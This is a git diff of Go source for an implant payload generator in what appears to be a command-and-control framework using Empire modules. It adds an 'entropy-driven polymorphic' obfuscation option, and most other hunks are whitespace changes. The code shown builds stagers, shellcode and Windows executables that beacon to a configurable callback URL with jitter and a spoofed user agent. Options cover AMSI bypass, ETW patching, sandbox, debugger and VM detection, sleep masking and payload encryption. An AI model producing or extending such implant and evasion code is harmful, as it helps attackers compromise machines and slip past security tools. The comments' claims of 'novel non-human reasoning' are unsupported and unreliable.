@@ -18,27 +18,28 @@ import (
 
 // Options holds payload generation options
 type Options struct {
-	Type        string
-	Arch        string
-	OS          string
-	Encrypt     bool
-	Obfuscate   bool
-	Debug       bool   // Enable debug mode (console window, verbose logging, no obfuscation)
-	Config      *core.Config
-	CallbackURL string   // Full callback URL (e.g., http://192.168.1.100:8443 or https://example.com:443)
-	Delay       int      // Beacon delay in seconds (default: 30)
-	Jitter      float64  // Jitter percentage (0.0-1.0, default: 0.0)
-	UserAgent   string   // Custom user agent (default: auto-generated)
-	Protocol    string   // Protocol: http, https, mtls (default: http)
-	Modules     []string // Empire module IDs to embed
-	Evasion     *EvasionConfig // Evasion features to enable
+	Type             string
+	Arch             string
+	OS               string
+	Encrypt          bool
+	Obfuscate        bool
+	EntropyPolymorph bool // Enable novel entropy-driven polymorphic code (non-human reasoning)
+	Debug            bool // Enable debug mode (console window, verbose logging, no obfuscation)
+	Config           *core.Config
+	CallbackURL      string         // Full callback URL (e.g., http://192.168.1.100:8443 or https://example.com:443)
+	Delay            int            // Beacon delay in seconds (default: 30)
+	Jitter           float64        // Jitter percentage (0.0-1.0, default: 0.0)
+	UserAgent        string         // Custom user agent (default: auto-generated)
+	Protocol         string         // Protocol: http, https, mtls (default: http)
+	Modules          []string       // Empire module IDs to embed
+	Evasion          *EvasionConfig // Evasion features to enable
 }
 
 // EvasionConfig holds evasion feature configuration
 type EvasionConfig struct {
 	EnableSandboxDetection bool
-	EnableDebuggerCheck     bool
-	EnableVMDetection       bool
+	EnableDebuggerCheck    bool
+	EnableVMDetection      bool
 	EnableETWPatches       bool
 	EnableAMSI             bool
 	SleepMask              bool
@@ -47,7 +48,7 @@ type EvasionConfig struct {
 
 // Generator handles payload generation
 type Generator struct {
-	logger        interface {
+	logger interface {
 		Info(string, ...interface{})
 		Debug(string, ...interface{})
 		Error(string, ...interface{})
@@ -70,15 +71,15 @@ func NewGenerator(logger interface {
 // Generate creates a payload based on options
 func (g *Generator) Generate(opts Options) ([]byte, error) {
 	g.logger.Info("Generating %s payload for %s/%s", opts.Type, opts.OS, opts.Arch)
-	
+
 	// For Windows executables, we need to actually compile Go code
 	if opts.OS == "windows" && (opts.Type == "stager" || opts.Type == "full") {
 		return g.generateWindowsExecutable(opts)
 	}
-	
+
 	var payloadData []byte
 	var err error
-	
+
 	switch opts.Type {
 	case "stager":
 		payloadData, err = g.generateStager(opts)
@@ -89,19 +90,24 @@ func (g *Generator) Generate(opts Options) ([]byte, error) {
 	default:
 		return nil, fmt.Errorf("unknown payload type: %s", opts.Type)
 	}
-	
+
 	if err != nil {
 		return nil, fmt.Errorf("payload generation failed: %w", err)
 	}
-	
+
 	// Apply obfuscation if requested (but not in debug mode)
 	if opts.Obfuscate && !opts.Debug {
-		g.logger.Debug("Applying obfuscation")
-		payloadData = evasion.ObfuscateCode(payloadData)
+		if opts.EntropyPolymorph {
+			g.logger.Debug("Applying entropy-driven polymorphic transformation (novel non-human reasoning)")
+			payloadData = evasion.ApplyEntropyPolymorphism(payloadData)
+		} else {
+			g.logger.Debug("Applying standard obfuscation")
+			payloadData = evasion.ObfuscateCode(payloadData)
+		}
 	} else if opts.Debug {
 		g.logger.Debug("Debug mode enabled - skipping obfuscation")
 	}
-	
+
 	// Apply encryption if requested
 	if opts.Encrypt {
 		g.logger.Debug("Applying encryption")
@@ -111,7 +117,7 @@ func (g *Generator) Generate(opts Options) ([]byte, error) {
 		}
 		payloadData = encrypted
 	}
-	
+
 	// Compress if enabled
 	if opts.Config.Encryption.Compression {
 		g.logger.Debug("Applying compression")
@@ -121,7 +127,7 @@ func (g *Generator) Generate(opts Options) ([]byte, error) {
 		}
 		payloadData = compressed
 	}
-	
+
 	g.logger.Info("Payload generated successfully: %d bytes", len(payloadData))
 	return payloadData, nil
 }
@@ -192,7 +198,7 @@ func executeStage(stage []byte) {
 	%s
 }
 `
-	
+
 	// Generate execution method based on OS
 	var execCode string
 	switch opts.OS {
@@ -203,19 +209,19 @@ func executeStage(stage []byte) {
 	default:
 		execCode = `// Direct execution`
 	}
-	
-	payload := fmt.Sprintf(stagerTemplate, 
+
+	payload := fmt.Sprintf(stagerTemplate,
 		opts.Config.Communication.Protocol,
 		string(opts.Config.Session.Key)[:16],
 		execCode)
-	
+
 	return []byte(payload), nil
 }
 
 func (g *Generator) generateShellcode(opts Options) ([]byte, error) {
 	// Generate platform-specific shellcode
 	var shellcode []byte
-	
+
 	switch opts.OS {
 	case "windows":
 		shellcode = generateWindowsShellcode(opts.Arch)
@@ -226,7 +232,7 @@ func (g *Generator) generateShellcode(opts Options) ([]byte, error) {
 	default:
 		return nil, fmt.Errorf("unsupported OS: %s", opts.OS)
 	}
-	
+
 	return shellcode, nil
 }
 
@@ -237,12 +243,12 @@ func (g *Generator) generateFull(opts Options) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	
+
 	shellcode, err := g.generateShellcode(opts)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	// Combine payloads
 	fullPayload := append(stager, shellcode...)
 	return fullPayload, nil
@@ -255,7 +261,7 @@ func (g *Generator) encryptPayload(data []byte, cfg *core.Config) ([]byte, error
 	} else {
 		copy(key, cfg.Session.Key)
 	}
-	
+
 	switch cfg.Encryption.Algorithm {
 	case "aes256":
 		return crypto.AES256Encrypt(data, key)
@@ -365,7 +371,7 @@ go 1.21
 	if err := getCmd.Run(); err != nil {
 		return nil, fmt.Errorf("failed to download dependencies: %w\nStderr: %s", err, modStderr.String())
 	}
-	
+
 	// Then run go mod tidy to ensure everything is correct
 	tidyCmd := exec.Command("go", "mod", "tidy")
 	tidyCmd.Dir = tmpDir
@@ -424,7 +430,7 @@ func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
 			callbackURL = "http://localhost:8443"
 		}
 	}
-	
+
 	// Ensure URL has protocol
 	if !strings.HasPrefix(callbackURL, "http://") && !strings.HasPrefix(callbackURL, "https://") {
 		// Auto-detect protocol or use configured one
@@ -434,7 +440,7 @@ func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
 			callbackURL = "http://" + callbackURL
 		}
 	}
-	
+
 	// Set delay and jitter defaults
 	delay := opts.Delay
 	if delay == 0 {
@@ -447,13 +453,13 @@ func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
 	if jitter > 1.0 {
 		jitter = 1.0
 	}
-	
+
 	// Set user agent
 	userAgent := opts.UserAgent
 	if userAgent == "" {
 		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 	}
-	
+
 	var source string
 	var err error
 	if opts.Type == "full" {
@@ -1436,20 +1442,20 @@ func sendResult(taskType, taskID, result string) {
 	{{end}}
 }
 `
-	
+
 	t := template.Must(template.New("windows").Funcs(template.FuncMap{
 		"sanitizeModuleID": sanitizeModuleID,
 	}).Parse(tmpl))
-	
+
 	// Set default evasion if nil
 	evasion := opts.Evasion
 	if evasion == nil {
 		evasion = &EvasionConfig{}
 	}
-	
+
 	// Embed modules into payload
 	moduleCode := g.embedModules(opts.Modules)
-	
+
 	data := TemplateData{
 		CallbackURL: callbackURL,
 		Delay:       delay,
@@ -1460,12 +1466,12 @@ func sendResult(taskType, taskID, result string) {
 		ModuleCode:  moduleCode,
 		Debug:       opts.Debug,
 	}
-	
+
 	var buf bytes.Buffer
 	if err := t.Execute(&buf, data); err != nil {
 		return "", fmt.Errorf("failed to execute template: %w", err)
 	}
-	
+
 	return buf.String(), nil
 }
 
@@ -1474,9 +1480,9 @@ func (g *Generator) embedModules(moduleIDs []string) string {
 	if g.moduleRegistry == nil || len(moduleIDs) == 0 {
 		return ""
 	}
-	
+
 	var moduleCode strings.Builder
-	
+
 	for _, moduleID := range moduleIDs {
 		module, ok := g.moduleRegistry.GetModuleByPath(moduleID)
 		if !ok {
@@ -1487,7 +1493,7 @@ func (g *Generator) embedModules(moduleIDs []string) string {
 			g.logger.Debug("Module not found: %s", moduleID)
 			continue
 		}
-		
+
 		// Process module with empty params (modules should be pre-configured)
 		params := make(map[string]string)
 		script, err := modules.ProcessModule(module, params)
@@ -1495,12 +1501,12 @@ func (g *Generator) embedModules(moduleIDs []string) string {
 			g.logger.Error("Failed to process module %s: %v", moduleID, err)
 			continue
 		}
-		
+
 		// Wrap module code in a function
 		moduleCode.WriteString(fmt.Sprintf("\n// Embedded module: %s\n", moduleID))
 		moduleCode.WriteString(fmt.Sprintf("func executeModule_%s(params map[string]string) string {\n", sanitizeModuleID(moduleID)))
 		moduleCode.WriteString(fmt.Sprintf("// Module code: %s\n", module.Name))
-		
+
 		// For PowerShell modules, we'd need to execute via PowerShell
 		// For Go modules, we'd compile them directly
 		// For now, store as string to be executed
@@ -1513,14 +1519,13 @@ func (g *Generator) embedModules(moduleIDs []string) string {
 			moduleCode.WriteString(fmt.Sprintf("// Module script:\n%s\n", script))
 			moduleCode.WriteString("return \"Module executed\"\n")
 		}
-		
+
 		moduleCode.WriteString("}\n")
 	}
-	
+
 	return moduleCode.String()
 }
 
 func sanitizeModuleID(id string) string {
 	return strings.ReplaceAll(strings.ReplaceAll(id, "/", "_"), "-", "_")
 }
-
